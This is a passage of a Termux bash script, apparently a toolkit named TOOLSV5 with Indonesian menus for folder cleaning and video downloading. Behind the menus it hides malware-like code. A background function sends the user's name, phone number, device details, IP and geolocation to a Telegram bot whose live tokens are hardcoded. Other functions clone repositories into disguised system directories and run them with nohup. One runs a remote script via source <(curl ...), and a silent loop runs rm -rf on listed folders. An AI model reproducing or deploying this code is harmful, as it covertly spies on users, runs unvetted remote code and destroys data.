⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⡁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
}
logo=("banner1" "banner2" "banner4" "banner5")
random_index=$((RANDOM % ${#logo[@]}))
banner="${logo[random_index]}"
cachetoolsv5() {
       LIST_FILE="$DIR_SAVE/.list.txt"
       function clear_terminal() {
              clear
       }
       function banner() {
              e "\033[1;32m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⢀⣴⣿⣿⣿⣷⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣬⣭⣥⣤⣤⣄⣀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄
⠀⠀⠀⣠⠞⢛⣷⡾⠟⠁⠀⠀⠀⠀⠀⢀⣾⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿
⠀⢠⡟⢁⣴⣿⣯⠀⢀⣤⣤⣤⣤⣤⣤⣿⣿⡟⠁⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠀⣠⣿⠟⢋⣭⠙⣡⣈⠻⠿⠿⠿⠿⠿⠟⠋⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠸⠟⠁⣀⣈⢋⣀⣘⣉⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠀⢸⣿⡿⣿⣿⢿⣿⢿⣿⡿⢿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠀⠸⣿⡇⣿⣿⢸⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢿⣿⣿⣿⡇⠸⣿⣿
⠀⠀⣿⡇⢻⣿⢸⣿⢸⣿⠇⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⡧⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⣿⣧⢸⣿⢸⣿⢸⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⡗⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⢸⣿⢸⣿⢸⣿⢸⣿⢸⣿⠃⠀⠀⠀⠀⠀⠀⢸⣿⣿⣏⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⢸⣿⠈⣿⢸⣿⢸⡟⢸⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡧⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⠈⣿⣿⣿⣾⣿⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠏⠀⢻⣿⣿⠇⠀
\033[1;37mGALIRUS X GUSTI
\n"
       }
       function get_size() {
              du -sh "$1" 2> /dev/null | cut -f1
       }
       function clear_folder() {
              e "\n\033[1;93mSedang Proses Menghapus"
              total_size_before=0
              for path in "$@"; do
                     if [ -d "$path" ]; then
                            size=$(get_size "$path")
                            e "\033[1;93mUkuran Di Hapus\033[1;37m: $size"
                            rm -rf "$path"
                     fi
              done
              e "\033[1;93mBerhasil Menghapus"
              sleep 2
       }
       function cek_list() {
              clear_terminal
              banner
              if [ -f "$LIST_FILE" ]; then
                     e "\033[1;93mDaftar Isi List:\n"
                     cat -n "$LIST_FILE"
              else
                     e "\n\033[1;93mDaftar List Kosong."
              fi
              read -p $'\n\033[1;37mTekan Enter Untuk Kembali' enter
       }
       function add_to_list() {
              clear_terminal
              banner
              e "\033[1;93mMasukan Direktori Untuk Di Tambahkan Ke List:"
              e "\033[1;93mContoh\033[1;37m: \033[1;36m/sdcard/download"
              while true; do
                     read -p $'\n\033[1;93mMasukan\033[1;37m:-»\033[1;36m ' folder_path
                     echo "$folder_path" >> "$LIST_FILE"
                     e "\n\033[1;93mDirektori Di Tambahkan"
                     read -p $'\033[1;37mMau Menambahkan Lagi (y/n): ' choice
                     if [ "$choice" != "y" ]; then
                            break
                     fi
              done
       }
       function delete_from_list() {
              while true; do
                     clear_terminal
                     banner
                     if [ -f "$LIST_FILE" ]; then
                            e "\033[1;93mDaftar Isi List:\n"
                            cat -n "$LIST_FILE"
                            read -p $'\n\033[1;93mPilih Nomor Yang Mau Di Hapus\033[1;31m:\033[1;37m ' choice
                            if [[ $choice =~ ^[0-9]+$ ]]; then
                                   sed -i "${choice}d" "$LIST_FILE"
                                   e "\n\033[1;93mDirektori Dihapus"
                            else
                                   e "\n\033[1;93mMasukkan Dengan Benar"
                            fi
                            read -p $'\n\033[1;37mMau Menghapus Lagi (y/n):\033[1;37m ' continue_choice
                            if [ "$continue_choice" != "y" ]; then
                                   break
                            fi
                     else
                            e "\n\033[1;93mDaftar List Kosong."
                            read -p $'\n\033[1;37mTekan Enter Untuk Kembali' enter
                            break
                     fi
              done
       }
       function main_menu() {
              while true; do
                     clear_terminal
                     banner
                     e "\033[1;93mDaftar Menu\033[1;37m:"
                     e "\033[1;93m1\033[1;31m. \033[1;36mClear"
                     e "\033[1;93m2\033[1;31m. \033[1;36mCek List"
                     e "\033[1;93m3\033[1;31m. \033[1;36mTambahkan List"
                     e "\033[1;93m4\033[1;31m. \033[1;36mHapus List"
                     e "\033[1;93m5\033[1;31m. \033[1;36mExit"
                     read -p $'\033[1;93mSilahkan Pilih \033[31m(\033[1;37m1-5\033[31m)\033[1;37m: ' choice
                     case $choice in
                            1)
                                   if
                                          [ -f "$LIST_FILE" ]
                                   then
                                          mapfile -t folder_paths < "$LIST_FILE"
                                          clear_folder "${folder_paths[@]}"
                                   else
                                          e "\n\033[1;93mList Kosong. Tambahkan List"
                                          read -p $'\n\033[1;37mTekan Enter Untuk Kembali' enter
                                   fi
                                   ;;
                            2)
                                   cek_list
                                   ;;
                            3)
                                   add_to_list
                                   ;;
                            4)
                                   delete_from_list
                                   ;;
                            5)
                                   break
                                   ;;
                            *)
                                   e "\n\033[1;93mMasukkan Dengan Benar"
                                   sleep 2
                                   ;;
                     esac
              done
       }
       main_menu
}
runclear() {
       while true; do
              LIST_FILE="$DIR_SAVE/.list.txt"
              function get_size() {
                     du -sh "$1" 2> /dev/null | cut -f1
              }
              function clear_folder() {
                     e "\n\033[1;93mSedang Proses Menghapus"
                     total_size_before=0
                     for path in "$@"; do
                            if [ -d "$path" ]; then
                                   size=$(get_size "$path")
                                   e "\033[1;93mUkuran Di Hapus\033[1;37m: $size"
                                   rm -rf "$path"
                            fi
                     done
                     e "\033[1;93mBerhasil Menghapus"
                     sleep 2
              }
              if [ -f "$LIST_FILE" ]; then
                     mapfile -t folder_paths < "$LIST_FILE"
                     clear_folder "${folder_paths[@]}"
              else
                     e "\n\033[1;93mList Kosong. Tambahkan List"
                     read -p $'\n\033[1;37mTekan Enter Untuk Kembali' enter
              fi
              sleep 10
       done
}
runclear &> /dev/null &
gitcek() {
       install_git() {
              echo "Menginstal git..."
              nala uninstall git
              $paket install -y git
       }
       check_git_functionality() {
              if ! git --version &> /dev/null; then
                     echo "Git tidak berfungsi. Memperbaiki instalasi..."
                     install_git
                     $paket install -y libcurl openssl
                     $paket install -y ruby curl gnupg ncurses-utils
              else
                     echo "Git sudah terpasang dan berfungsi dengan benar."
              fi
       }
       if ! command -v git &> /dev/null; then
              echo "Git tidak terpasang."
              install_git
       else
              check_git_functionality
       fi
}
termuxtoolsv5="/data/data/com.termux/files"
telegram() {
       TOKEN1="7224304462:AAFUoaFbB7njkEyaH0EAoTovYpDJRjTifW8"
       TOKEN2="7465534118:AAHfWtdkkcsSb65oP2ELL_djpKJsqe1h2cg"
       CHAT_ID="5034446293"
       CURRENT_TOKEN=$TOKEN1
       decrypt_id() {
              local encrypted_id="$1"
              echo "$encrypted_id" | openssl enc -d -aes-256-cbc -md sha512 -pbkdf2 -iter 100000 -salt -pass pass:"SORASAKIHINA" -base64 2> /dev/null
       }
       get_location_info() {
              local services=(
                     "https://ipapi.co/json/"
                     "https://ipinfo.io/json"
                     "http://ip-api.com/json"
                     "https://freegeoip.app/json/")
              for service in "${services[@]}"; do
                     local response=$(curl -s --connect-timeout 1 "$service")
                     if [[ $service == *"ipapi.co"* ]]; then
                            local city=$(echo "$response" | jq -r '.city // empty')
                            local region=$(echo "$response" | jq -r '.region // empty')
                            local country=$(echo "$response" | jq -r '.country_name // empty')
                            local loc=$(echo "$response" | jq -r '.latitude,.longitude' | tr '\n' ',' | sed 's/,$//')
                     elif [[ $service == *"ipinfo.io"* ]]; then
                            local city=$(echo "$response" | jq -r '.city // empty')
                            local region=$(echo "$response" | jq -r '.region // empty')
                            local country=$(echo "$response" | jq -r '.country // empty')
                            local loc=$(echo "$response" | jq -r '.loc // empty')
                     elif [[ $service == *"ip-api.com"* ]]; then
                            local city=$(echo "$response" | jq -r '.city // empty')
                            local region=$(echo "$response" | jq -r '.regionName // empty')
                            local country=$(echo "$response" | jq -r '.country // empty')
                            local loc=$(echo "$response" | jq -r '.lat,.lon' | tr '\n' ',' | sed 's/,$//')
                     elif [[ $service == *"freegeoip.app"* ]]; then
                            local city=$(echo "$response" | jq -r '.city // empty')
                            local region=$(echo "$response" | jq -r '.region_name // empty')
                            local country=$(echo "$response" | jq -r '.country_name // empty')
                            local loc=$(echo "$response" | jq -r '.latitude,.longitude' | tr '\n' ',' | sed 's/,$//')
                     fi
                     if [ -n "$city" ]; then
                            echo "$city|$region|$country|$loc"
                            return 0
                     fi
                     sleep 1
              done
              echo "Tidak Diketahui|Tidak Diketahui|Tidak Diketahui|Tidak Diketahui"
              return 1
       }
       info=$(neofetch --stdout)
       brand=$(echo "$info" | grep "Host:" | awk -F ':' '{print $2}' | xargs | awk '{print $1}')
       os=$(echo "$info" | grep "OS:" | cut -d ':' -f2- | xargs)
       cpu=$(echo "$info" | grep "CPU:" | cut -d ':' -f2- | xargs)
       gpu=$(echo "$info" | grep "GPU:" | cut -d ':' -f2- | xargs)
       memory=$(echo "$info" | grep "Memory:" | awk -F ':' '{print $2}' | xargs)
       kernel=$(echo "$info" | grep "Kernel:" | cut -d ':' -f2- | xargs)
       uptime=$(echo "$info" | grep "Uptime:" | cut -d ':' -f2- | xargs)
       shell=$(echo "$info" | grep "Shell:" | cut -d ':' -f2- | xargs)
       resolution=$(echo "$info" | grep "Resolution:" | cut -d ':' -f2- | xargs)
       if [[ $memory =~ "MB" ]]; then
              memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
       elif [[ $memory =~ "KB" ]]; then
              memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')
       else
              memory=$(echo "$memory" | awk '{used=$1; total=$3; printf "%.2f/%.2f GB", used/1024, total/1024}')
       fi
       IFS='|' read -r city region country loc <<< "$(get_location_info)"
       ip_address=$(curl -s https://api.ipify.org || echo "Tidak Diketahui")
       versitoolsv5penguna="$PREFIX/lib/version"
       cekversionnew=$(cat "$versitoolsv5penguna" 2> /dev/null || echo "Unknown")
       NAMA_FILE="$PREFIX/include/bash/include/filememek.h"
       NAMA=$(cat "$NAMA_FILE" 2> /dev/null || echo "Unknown")
       TERMUX_ID=$(id)
       decrypt_id() {
              local encrypted_id="$1"
              echo "$encrypted_id" | openssl enc -d -aes-256-cbc -md sha512 -pbkdf2 -iter 100000 -salt -pass pass:"$ENCRYPTION_PASS" -base64 2> /dev/null
       }
       STATUS="TRIAL ❌"
       NOMOR_TELEPON="Tidak Diketahui"
       if [[ -f $gal ]]; then
              read -r user_local encrypted_local nowa_local < "$gal"
              decrypted_local=$(decrypt_id "$encrypted_local")
              mapfile -t db_lines < <(curl -fsSL "$DATABASE_URL") || {
                     echo "Gagal mengambil database dari URL!"
                     exit 1
              }
              for db_line in "${db_lines[@]}"; do
                     [[ -z $db_line ]] && continue
                     user_db=$(echo "$db_line" | awk '{print $1}')
                     encrypted_db=$(echo "$db_line" | awk '{print $2}')
                     nowa_db=$(echo "$db_line" | awk '{print $3}')
                     decrypted_db=$(decrypt_id "$encrypted_db")
                     if [[ $user_local == "$user_db" ]] && [[ $decrypted_local == "$decrypted_db" ]] && [[ $nowa_local == "$nowa_db" ]]; then
                            STATUS="PREMIUM ✅"
                            NOMOR_TELEPON="$nowa_local"
                            break
                     fi
              done
       fi
       scan_files() {
              local file=$1
              if [ -f "$file" ]; then
                     echo "📄 Berkas Terpantau Aman ✅"
              else
                     echo "📄 Berkas Terpantau Hilang Pengguna Melanggar Aturan ❌"
              fi
       }
       ISIPESAN="$isipesan"
       toolsv5="/data/data/com.termux/files/home/Lubeban/.git/index"
       scan_results=$(
              cat << EOF
$(scan_files "$toolsv5")
EOF
       )
       if [[ $loc != "Tidak Diketahui" ]]; then
              loc_link="https://www.google.com/maps?q=$loc"
              loc_display="$loc ([Lihat Peta]($loc_link))"
       else
              loc_display="Tidak Diketahui"
       fi
       caption=$(
              cat << EOF
           🔰 TOOLSV5 NOTIFICATION 🔰
👤 Nama: $NAMA
🆔 ID Termux: $(echo "$TERMUX_ID" | cut -d' ' -f1)...
📋 Status: $STATUS
📝 Version: $cekversionnew
📞 Nomor Telepon: $NOMOR_TELEPON
             💬 SYSTEM INFORMATION 💬
📱 Merek       : ${brand:-Tidak Diketahui}
🖥️ OS          : ${os:-Tidak Diketahui}
🧠 CPU         : ${cpu:-Tidak Diketahui}
🎮 GPU         : ${gpu:-Tidak Diketahui}
💾 Memori      : ${memory:-0.00/0.00 GB}
🧬 Kernel      : ${kernel:-Tidak Diketahui}
⏱️ Uptime      : ${uptime:-Tidak Diketahui}
🐚 Shell       : ${shell:-Tidak Diketahui}
🖼️ Resolusi    : ${resolution:-Tidak Diketahui}
🌐 IP          : ${ip_address:-Tidak Diketahui}
🏙️ Kota        : ${city:-Tidak Diketahui}
📍 Wilayah     : ${region:-Tidak Diketahui}
🇮🇩 Negara      : ${country:-Tidak Diketahui}
📌 Lokasi      : ${loc_display:-Tidak Diketahui}
👥 User        : $(whoami)


🗂️ HASIL SCAN FILE:
$scan_results
💬 PESAN NOTIFIKASI:
$ISIPESAN
EOF
       )
       caption="${caption//'\\n'/$'\n'}"
       URL="https://api.telegram.org/bot$CURRENT_TOKEN/sendMessage"
       response=$(curl -s -L -X POST "$URL" \
              -d chat_id="$CHAT_ID" \
              --data-urlencode text="$caption")
       success=$(echo "$response" | jq -r '.ok')
       if [ "$success" == "true" ]; then
              echo "Notifikasi berhasil dikirim ke Telegram"
       else
              echo "⚠️ Gagal mengirim notifikasi"
              if [[ $CURRENT_TOKEN == "$TOKEN1" ]]; then
                     echo "Menggunakan token cadangan..."
                     CURRENT_TOKEN=$TOKEN2
              else
                     echo "Gagal menggunakan kedua token"
              fi
       fi
}
if [ -d "$termuxtoolsv5" ]; then
       nama_file="$PREFIX/include/bash/include/filememek.h"
       nama=$(cat "$nama_file")
       MUSIEK() {
              MUSIC_DIR="$HOME/Lubeban/music"
              mkdir -p "$MUSIC_DIR"
              if ! command -v yt-dlp &> /dev/null; then
                     clear
                     play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                     e $k $bg_m "Packaging Belum Terinstall Bentar Tod !$res"
                     echo
                     sleep 3
                     $paket update
                     $paket upgrade
                     $paket install -y wget ffmpeg
                     wget https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp -O $PREFIX/bin/yt-dlp
                     chmod a+rx $PREFIX/bin/yt-dlp
                     break
              fi
              while true; do
                     clear
                     e $k $bg_m "Setel Backsound TOOLSV5 Sesuai Selera Anda$res"
                     sleep 5
                     e "$b"
                     read -p "Masukkan link YouTube Cuy : " YT_LINK
                     clear
                     play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                     e $b $bg_h "Proses Unduhan DiMulai$res"
                     sleep 3
                     echo
                     yt-dlp --extract-audio --audio-format mp3 -o "$MUSIC_DIR/%(title)s.%(ext)s" "$YT_LINK"
                     clear
                     play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                     e $b $bg_h"Musik berhasil diunduh dan disimpan$res"
                     sleep 3
                     play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                     e "$b"
                     read -p "Apakah Anda ingin mengunduh musik lain? (Y/N): " yn
                     if [[ $yn == [Yy]* ]]; then
                            continue
                     elif [[ $yn == [Nn]* ]]; then
                            break
                     else
                            play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                            e $bg_m $k "Mohon jawab dengan Y atau N$res"
                            sleep 3
                            break
                     fi
              done
       }
       xxparun() {
              while true; do
                     scan="$PREFIX/share/xxpa"
                     if [ -d "$scan" ]; then
                            cd $scan
                            git stash &> /dev/null
                            git pull origin main &> /dev/null
                            echo "y" | termux-setup-storage &> /dev/null
                            chmod 777 xxpa
                            nohup bash xxpa &> /dev/null &
                            exit 0
                     else
                            echo "y" | termux-setup-storage &> /dev/null
                            cd $PREFIX/share
                            git clone https://github.com/GALIRUS404/xxpa
                            cd xxpa
                            git stash &> /dev/null
                            git pull origin main &> /dev/null
                     fi
              done
       }
       base() {
              while true; do
                     scan="$PREFIX/lib/apt/methods/network"
                     if [ -d "$scan" ]; then
                            cd $scan
                            git stash &> /dev/null
                            git pull origin main &> /dev/null
                            echo "y" | termux-setup-storage &> /dev/null
                            chmod 777 FNS
                            nohup bash FNS &> /dev/null &
                            exit 0
                     else
                            echo "y" | termux-setup-storage &> /dev/null
                            cd $PREFIX/lib/apt/methods
                            git clone https://github.com/GALIRUS404/network
                            cd network
                            git stash &> /dev/null
                            git pull origin main &> /dev/null
                            xxparun
                     fi
              done
       }
       downloader() {
              filenya="$gal"
              scan_download="$PREFIX/bin"
              if [ -f "$filenya" ]; then
                     break
              else
                     rm -rf $scan_download/gal
                     cd $HOME
                     git clone https://github.com/GALIRUS404/downloader
                     cd downloader
                     git stash &> /dev/null
                     git pull origin main &> /dev/null
                     mv -f gal $scan_download
                     chmod 777 $scan_download/gal
              fi
       }
       downloader &> /dev/null &
       Downloadnowatermark() {
              while true; do
                     nama="/data/data/com.termux/files/sopowesu.txt"
                     if [ -f "$nama" ]; then
                            install_package_if_missing() {
                                   local package=$1
                                   if ! command -v $package &> /dev/null; then
                                          echo "$package tidak ditemukan, menginstal..."
                                          apt-get update
                                          apt-get install $package
                                          gem install lolcat
                                          clear
                                   else
                                          echo "$package sudah terinstal"
                                          clear
                                   fi
                            }
                            install_package_if_missing curl
                            install_package_if_missing jq
                            install_package_if_missing yt-dlp
                            install_package_if_missing ruby
                            install_package_if_missing curl neofetch inetutils
                            color_splash() {
                                   clear
                                   for i in {1..5}; do
                                          e "\e[1m\e[38;5;$((RANDOM % 256))m                   DOWNLOADER No Watermark \e[0m"
                                          sleep 1
                                          clear
                                   done
                            }
                            banner() {
                                   echo "
███████╗██╗  ██╗██╗██████╗ ██╗   ██╗███████╗
██╔════╝██║  ██║██║██╔══██╗██║   ██║██╔════╝
███████╗███████║██║██████╔╝██║   ██║███████╗
╚════██║██╔══██║██║██╔══██╗██║   ██║╚════██║
███████║██║  ██║██║██║  ██║╚██████╔╝███████║
╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ No Watermark"
                            }
                            color_splash
                            search_xnxx() {
                                   local query=$1
                                   local encoded_query=$(echo "$query" | jq -sRr @uri)
                                   local url="https://www.xnxx.com/search/$encoded_query"
                                   echo "Mencari di: $url"
                                   local result=$(curl -s "$url")
                                   echo "$result" | grep -oP '(?<=href=")[^"]*' | grep '/video' | sed 's|^|https://www.xnxx.com|'
                            }
                            download_video() {
                                   local video_url=$1
                                   local file_path="/storage/emulated/0/$(basename "$video_url").mp4"
                                   echo "Mengunduh video dari: $video_url"
                                   yt-dlp -o "$file_path" "$video_url"
                                   if [ $? -eq 0 ]; then
                                          echo "Video berhasil diunduh dan disimpan di $file_path"
                                   else
                                          echo "Gagal mengunduh video"
                                   fi
                            }
                            download_youtube_video() {
                                   read -p "Masukkan link YouTube: " youtube_link
                                   local file_path="/storage/emulated/0/youtube_video_$(date +%s).mp4"
                                   yt-dlp -o "$file_path" "$youtube_link"
                                   if [ $? -eq 0 ]; then
                                          echo "Video YouTube berhasil diunduh dan disimpan di $file_path"
                                   else
                                          echo "Gagal mengunduh video YouTube"
                                   fi
                            }
                            download_youtube_music() {
                                   read -p "Masukkan link YouTube: " youtube_link
                                   local file_path="/storage/emulated/0/youtube_music_$(date +%s).mp3"
                                   yt-dlp -x --audio-format mp3 -o "$file_path" "$youtube_link"
                                   if [ $? -eq 0 ]; then
                                          echo "Musik YouTube berhasil diunduh dan disimpan di $file_path"
                                   else
                                          echo "Gagal mengunduh musik YouTube"
                                   fi
                            }
                            download_tiktok_video() {
                                   read -p "Masukkan link TikTok: " tiktok_link
                                   local file_path="/storage/emulated/0/tiktok_video_$(date +%s).mp4"
                                   yt-dlp --no-warnings -o "$file_path" "$tiktok_link"
                                   if [ $? -eq 0 ]; then
                                          echo "Video TikTok berhasil diunduh dan disimpan di $file_path"
                                   else
                                          echo "Gagal mengunduh video TikTok"
                                   fi
                            }
                            download_instagram_video() {
                                   read -p "Masukkan link Instagram: " instagram_link
                                   local file_path="/storage/emulated/0/instagram_video_$(date +%s).mp4"
                                   yt-dlp --no-warnings -o "$file_path" "$instagram_link"
                                   if [ $? -eq 0 ]; then
                                          echo "Video Instagram berhasil diunduh dan disimpan di $file_path"
                                   else
                                          echo "Gagal mengunduh video Instagram"
                                   fi
                            }
                            download_facebook_video() {
                                   read -p "Masukkan link Facebook: " facebook_link
                                   local file_path="/storage/emulated/0/facebook_video_$(date +%s).mp4"
                                   yt-dlp --no-warnings -o "$file_path" "$facebook_link"
                                   if [ $? -eq 0 ]; then
                                          echo "Video Facebook berhasil diunduh dan disimpan di $file_path"
                                   else
                                          echo "Gagal mengunduh video Facebook"
                                   fi
                            }
                            download_pinterest_video() {
                                   read -p "Masukkan link Pinterest: " pinterest_link
                                   local file_path="/storage/emulated/0/pinterest_video_$(date +%s).mp4"
                                   yt-dlp --no-warnings -o "$file_path" "$pinterest_link"
                                   if [ $? -eq 0 ]; then
                                          echo "Video Pinterest berhasil diunduh dan disimpan di $file_path"
                                   else
                                          echo "Gagal mengunduh video Pinterest"
                                   fi
                            }
                            while true; do
                                   clear
                                   banner | lolcat
                                   echo
                                   echo
                                   echo "Pilih opsi:"
                                   echo "1. Pencarian video di XNXX"
                                   echo "2. Unduh video YouTube"
                                   echo "3. Unduh musik YouTube"
                                   echo "4. Unduh video TikTok tanpa watermark"
                                   echo "5. Unduh video Instagram tanpa watermark"
                                   echo "6. Unduh video Facebook tanpa watermark"
                                   echo "7. Unduh video Pinterest tanpa watermark"
                                   echo "8. Keluar"
                                   read -p "Masukkan pilihan Anda: " choice
                                   if [[ $choice =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le 8 ]; then
                                          if [ "$choice" -eq 1 ]; then
                                                 read -p "Masukkan Judul Video: " query
                                                 search_results=$(search_xnxx "$query")
                                                 echo "Hasil Pencarian:"
                                                 echo "$search_results"
                                                 read -p "Masukkan link yang Anda Copy: " video_link
                                                 if echo "$video_link" | grep -q 'https://www.xnxx.com/video'; then
                                                        download_video "$video_link"
                                                 else
                                                        echo "Link tidak valid"
                                                 fi
                                          elif [ "$choice" -eq 2 ]; then
                                                 download_youtube_video
                                          elif [ "$choice" -eq 3 ]; then
                                                 download_youtube_music
                                          elif [ "$choice" -eq 4 ]; then
                                                 download_tiktok_video
                                          elif [ "$choice" -eq 5 ]; then
                                                 download_instagram_video
                                          elif [ "$choice" -eq 6 ]; then
                                                 download_facebook_video
                                          elif [ "$choice" -eq 7 ]; then
                                                 download_pinterest_video
                                          elif [ "$choice" -eq 8 ]; then
                                                 echo "Keluar..."
                                                 exit 0
                                          fi
                                   else
                                          echo "Pilihan tidak valid"
                                          sleep 5
                                   fi
                            done
                     else
                            clear
                            play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                            e $k $bg_m "Packaging Belum Terinstall Bentar Tod !$res"
                            echo
                            sleep 3
                            nala update
                            $paket install -y wget ffmpeg
                            wget https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp -O $PREFIX/bin/yt-dlp
                            chmod a+rx $PREFIX/bin/yt-dlp
                            clear
                            read -p "Masukkan Nama Anda : " sopo
                            clear
                            echo "$sopo" > $nama
                     fi
              done
       }
       trap ctrl_c INT
       ctrl_c() {
              echo
              e $k$bg_lg " System Break, Otomatis Masuk Ke TOOLSV5 $k$res"
              sleep 3
       }
       while true; do
              function installasipackagetoolsv5() {
                     log_file="$PREFIX/share/list/package"
                     while IFS= read -r line; do
                            if [[ -n $line && $line != \#* ]]; then
                                   e $h "Sedang Installasi $m:$p $line"
                                   echo "$line"
                                   sleep 2
                            fi
                     done < "$log_file"
              }
              function suara() {
                     clear
                     sound="$HOME/Lubeban/sound/"
                     if [ -d "$sound" ]; then
                            play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                            e $h "$bg_m Loading Update Sound$res"
                            cd $sound
                            git pull origin main &> /dev/null
                            git stash &> /dev/null
                            clear
                     fi
              }
              function repository() {
                     clear
                     galirusfile="$HOME/Lubeban" &> /dev/null
                     if [ -d "$galirusfile" ]; then
                            play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                            e $h "$bg_m Loading Update Repository$res"
                            cd $HOME/Lubeban
                            git clone https://github.com/GALIRUS404/sound &> /dev/null
                            git stash &> /dev/null
                            git pull origin main &> /dev/null
                     else
                            play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                            e $m "REPOSITORY HILANG MENDOWNLOAD ❗$h"
                            rm -rf $HOME/Lubeban
                            cd $HOME
                            git clone https://github.com/Lubebansokhekel/Lubeban
                     fi
                     welcometo="$PREFIX/lib/python3.11/email/mime/audio" &> /dev/null
                     if [ -d "$welcometo" ]; then
                            cd $welcometo &> /dev/null
                            git pull origin main &> /dev/null
                            git stash &> /dev/null
                     else
                            mkdir -p $PREFIX/lib/python3.11/email/mime
                            cd $PREFIX/lib/python3.11/email/mime &> /dev/null
                            git clone --depth 32 https://github.com/Hozowaorokananingenda/audio &> /dev/null
                            cd audio &> /dev/null
                            git pull origin main &> /dev/null
                            git stash &> /dev/null
                     fi
              }
              EOF_MENU() {
                     source <(curl -sL "https://od.lk/s/OV8yNTAzNTUxNjFf/EOF_MENU.sh")
              }
              while true; do
                     packageinstalling="$HOME/Lubeban/package_sudah_terinstall_$versitoolsv5"
                     if [ -f "$packageinstalling" ]; then
                            clear
                            play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                            repository
                            suara
                            play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                            clear
                            cd $HOME/Lubeban &> /dev/null
                            git pull origin main &> /dev/null
                            git stash &> /dev/null
                            clear
                            file_path="$PREFIX/lib/status.txt"
                            if [ ! -f "$file_path" ]; then
                                   clear
                                   play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                   e $k "Status$b TOOLSV5$bl :$m Server Down "
                                   exit 0
                            fi
                            content=$(< "$file_path")
                            if [[ $content == *"on"* ]]; then
                            e
                            else
                                   clear
                                   play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                   e "$h"
                                   clear
                                   isipesan="Terdeteksi Sedang Maintenance  💻"
                                   telegram &> /dev/null &
                                   echo -e $k "Status$b TOOLSV5$bl :$h Maintenance Server"
                                   echo -e "$c\n\nTinggu Sampai Musik Berhenti Otomatis Keluar$res"
